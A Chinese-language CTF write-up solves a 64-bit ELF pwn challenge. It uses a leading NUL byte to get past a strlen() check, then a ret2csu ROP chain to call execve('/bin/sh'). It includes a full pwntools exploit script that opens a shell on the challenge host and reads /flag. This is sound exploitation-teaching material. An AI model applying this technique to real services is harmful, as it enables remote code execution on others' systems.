# Ret2csu

## 题目简述

64 位 ELF 无 PIE、无 Canary，NX 开启。程序先向 `.bss` 地址 `0x404090` 读取 0x10 字节，再向 0x10 字节栈缓冲区读取 0x60 字节。栈输入随后经过 `strlen()` 检查，长度大于 `0x10` 就退出。

二进制缺少直接控制全部函数参数的简单 gadget，但 `__libc_csu_init` 中存在经典 ret2csu gadget，可间接控制 `rdi`、`rsi`、`rdx` 并调用内存中的函数指针。

## 解题过程

第一轮输入在 `.bss` 中连续布置命令字符串和调用地址：

```text
0x404090: "/bin/sh\x00"
0x404098: 0x40126d
```

`0x40126d` 是程序中已有的 `call execve@plt` 指令地址。第二轮输入以 `\x00` 开头，使 `strlen()` 立即返回 0，但 `read()` 仍会把 NUL 后面的完整 ROP 链写入栈中。

两个 CSU gadget 的语义为：

```asm
0x4013ba: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret

0x4013a0: mov rdx, r14
            mov rsi, r13
            mov edi, r12d
            call qword ptr [r15 + rbx*8]
```

令 `rbx=0`、`r12=0x404090`、`r13=0`、`r14=0`、`r15=0x404098`，间接调用即变为 `execve("/bin/sh", NULL, NULL)`。

连接参数由 `HOST`、`PORT` 环境变量提供：

```python
import os
from pwn import *

context.arch = "amd64"
HOST = os.environ["HOST"]
PORT = int(os.environ["PORT"])
io = remote(HOST, PORT)

binsh = 0x404090
call_ptr = 0x404098
call_execve = 0x40126d
csu_call = 0x4013a0
csu_pop = 0x4013ba

io.sendafter(
    b"goodnight to her~",
    b"/bin/sh\x00" + p64(call_execve),
)

payload = b"\x00" + b"A" * 0x0f + b"B" * 8
payload += flat(
    csu_pop,
    0,          # rbx
    0,          # rbp；execve 成功后不会返回到 CSU 循环
    binsh,      # r12 -> edi
    0,          # r13 -> rsi
    0,          # r14 -> rdx
    call_ptr,   # r15 -> [r15 + rbx*8]
    csu_call,
)

io.sendafter(b"want to do?", payload)
io.sendline(b"cat /flag")
io.interactive()
```

仓库压缩包只包含 `dist/pwn`，没有保存比赛实例中的 `/flag` 内容，因此最终字符串应以当前服务返回为准。

## 方法总结

- 核心技巧：用前置 NUL 绕过 `strlen()`，再使用 ret2csu 控制三个参数和一次间接调用。
- 识别信号：64 位 ELF 缺少 `pop rdx` 等 gadget，但保留完整的 `__libc_csu_init`；同时存在可写 `.bss` 和栈溢出。
- 复用要点：ret2csu 的调用目标必须是“保存函数地址的内存位置”，不是直接函数地址；还要确认 `mov edi, r12d` 的 32 位截断不会破坏参数地址。
